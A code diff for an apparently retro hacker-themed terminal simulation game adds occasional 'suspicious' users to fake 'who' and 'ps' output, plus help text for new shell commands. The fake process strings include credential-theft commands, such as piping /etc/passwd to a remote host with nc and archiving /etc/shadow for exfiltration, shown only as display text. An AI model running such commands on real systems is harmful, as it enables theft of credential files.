@@ -117,6 +117,7 @@ Action required: plug in the car.
 ];
 
 export const WHO_ALWAYS = ['sysadmin', 'root'];
+export const WHO_RARE = ['sventek', 'guest', 'bsherwin', 'hunter', 'sdinet', 'fieldsvc', 'uucp'];
 export const WHO_POOL = [
 	'wendell',
 	'salem',
@@ -322,6 +323,11 @@ export function generateWho(): string[] {
 	const picked = shuffled.slice(0, count);
 	const users = [...WHO_ALWAYS, ...picked];
 
+	// ~15% chance a suspicious user appears
+	if (Math.random() < 0.15) {
+		users.push(pick(WHO_RARE));
+	}
+
 	const hours = ['06', '07', '08', '09', '10', '11', '23'];
 	const minutes = () => String(Math.floor(Math.random() * 60)).padStart(2, '0');
 
@@ -377,12 +383,35 @@ export function generatePs(): string[] {
 		return `${user.padEnd(14)} ${pid}  ${cpu.padStart(4)}  ${mem.padStart(4)}  ${time.padStart(6)} ${prog}`;
 	});
 
+	// ~15% chance a suspicious user appears with a sketchy process
+	if (Math.random() < 0.15) {
+		const suspect = pick(WHO_RARE);
+		const sketchy = pick([
+			'cat /etc/passwd | nc kremlin.su 4444',
+			'find / -name "*.mil" -exec cat {} \\;',
+			'grep -r "sdi" /opt/ /var/',
+			'rlogin pentagon.mil -l guest',
+			'tar czf /tmp/.exfil.tar.gz /etc/shadow /var/log/auth.log',
+			'finger -l @milnet.arpa',
+			'telnet dockmaster.arpa 23',
+			'rsh mainframe "cat /etc/passwd" > /tmp/.harvest',
+		]);
+		const pid = String(9900 + Math.floor(Math.random() * 99)).padStart(5, ' ');
+		userlines.push(
+			`${suspect.padEnd(14)} ${pid}   ${(Math.random() * 2).toFixed(1).padStart(4)}   ${(Math.random() * 1).toFixed(1).padStart(4)}  ${'03:14'.padStart(6)} ${sketchy}`,
+		);
+	}
+
 	return [header, ...syslines, ...oslines, ...userlines];
 }
 
 export const HELP_TEXT = [
 	'Available commands:',
 	'',
+	'  ls [path]    List directory contents (-a to show hidden)',
+	'  cat <path>   Print file contents',
+	'  cd [path]    Change directory',
+	'  pwd          Print working directory',
 	'  mail         Read your mail',
 	'  read <n>     Read message number <n>',
 	'  who          Show logged-in users',
